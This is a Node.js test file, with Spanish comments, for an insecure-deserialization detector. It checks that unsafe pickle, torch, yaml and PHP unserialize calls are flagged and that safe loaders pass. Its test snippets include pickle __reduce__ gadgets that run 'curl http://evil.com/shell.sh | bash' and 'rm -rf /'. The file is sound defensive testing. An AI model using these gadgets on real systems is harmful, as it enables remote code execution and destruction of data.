"use strict";
// Pruebas para lib/deserialization.js — el motor de detect_insecure_deserialization_risk.
//
// Correr con: node test-deserialization.js

const assert = require('assert');
const { checkInsecureDeserializationRisk } = require('./lib/deserialization');

let pass = 0;
let fail = 0;

function test(name, fn) {
  try {
    fn();
    pass++;
    console.log('OK   - ' + name);
  } catch (err) {
    fail++;
    console.log('FAIL - ' + name);
    console.log('       ' + (err && err.stack ? err.stack : err));
  }
}

// ---------- Casos positivos (deben marcar riesgo) ----------

test('pickle.loads sobre bytes de una petición de red -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
def procesar_modelo(request):
    datos = request.get_data()
    modelo = pickle.loads(datos)
    return modelo
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('torch.load sin weights_only=True (patrón CVE-2025-45146/ModelCache) -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
def cargar_modelo(response):
    buffer = io.BytesIO(response.content)
    return torch.load(buffer)
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('yaml.load sin Loader seguro -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `config = yaml.load(request.data)`
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('unserialize() de PHP sobre datos externos -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `<?php $obj = unserialize($_POST['data']); ?>`
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('método __reduce__ con os.system (payload de pickle) -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://evil.com/shell.sh | bash',))
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('pickle.loads con un comentario que solo PROMETE una validación pendiente (TODO) -> sigue siendo alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
def cargar_modelo(datos_subidos):
    # TODO: verificar checksum antes de cargar esto, pendiente
    return pickle.loads(datos_subidos)
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('método __reduce__ con getattr(os, "system") (evade el substring literal "os.system") -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
class Exploit:
    def __reduce__(self):
        return (getattr(os, 'system'), ('curl http://evil.com/shell.sh | bash',))
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('método __reduce__ con getattr(os, "popen") -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
class Exploit:
    def __reduce__(self):
        return (getattr(os, 'popen'), ('id',))
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('método __reduce__ con __import__("os").system -> alto riesgo', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
class Exploit:
    def __reduce__(self):
        return (__import__('os').system, ('id',))
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('combinación: pickle.loads sin validar + gadget __reduce__ -> puntaje peor que cualquiera de los dos solos', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
def cargar(datos_subidos):
    return pickle.loads(datos_subidos)

class Exploit:
    def __reduce__(self):
        return (subprocess.run, (['rm', '-rf', '/'],))
    `
  });
  const solo1 = checkInsecureDeserializationRisk({ codigo: `def cargar(datos_subidos):\n    return pickle.loads(datos_subidos)` });
  assert.ok(r.puntaje < solo1.puntaje, 'r.puntaje=' + r.puntaje + ' solo1.puntaje=' + solo1.puntaje);
});

// ---------- Casos negativos (no deben marcar riesgo alto) ----------

test('yaml.safe_load (uso normal) -> aceptable', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `config = yaml.safe_load(open('config.yaml').read())`
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
});

test('yaml.load con Loader=yaml.SafeLoader explícito -> aceptable', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `config = yaml.load(datos, Loader=yaml.SafeLoader)`
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
});

test('torch.load con weights_only=True -> aceptable', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `modelo = torch.load(buffer, weights_only=True)`
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
});

test('pickle.load con un Unpickler restringido (RestrictedUnpickler/find_class) -> aceptable', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in SAFE_BUILTINS:
            return getattr(builtins, name)
        raise pickle.UnpicklingError("clase no permitida")

def cargar(datos):
    return RestrictedUnpickler(io.BytesIO(datos)).load()
    `
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
});

test('json.loads (formato de datos, no de objetos) -> aceptable, no se marca en absoluto', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `datos = json.loads(request.get_data())`
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
  assert.strictEqual(r.puntaje, 100);
});

test('sin ninguna llamada de deserialización -> aceptable, puntaje 100', () => {
  const r = checkInsecureDeserializationRisk({
    codigo: `function sumar(a, b) { return a + b; }`
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
  assert.strictEqual(r.puntaje, 100);
});

test('código vacío -> lanza error', () => {
  assert.throws(() => checkInsecureDeserializationRisk({ codigo: '   ' }));
});

test('sin campo "codigo" -> lanza error', () => {
  assert.throws(() => checkInsecureDeserializationRisk({}));
});

console.log('\n' + pass + ' pasaron, ' + fail + ' fallaron.');
if (fail > 0) process.exit(1);
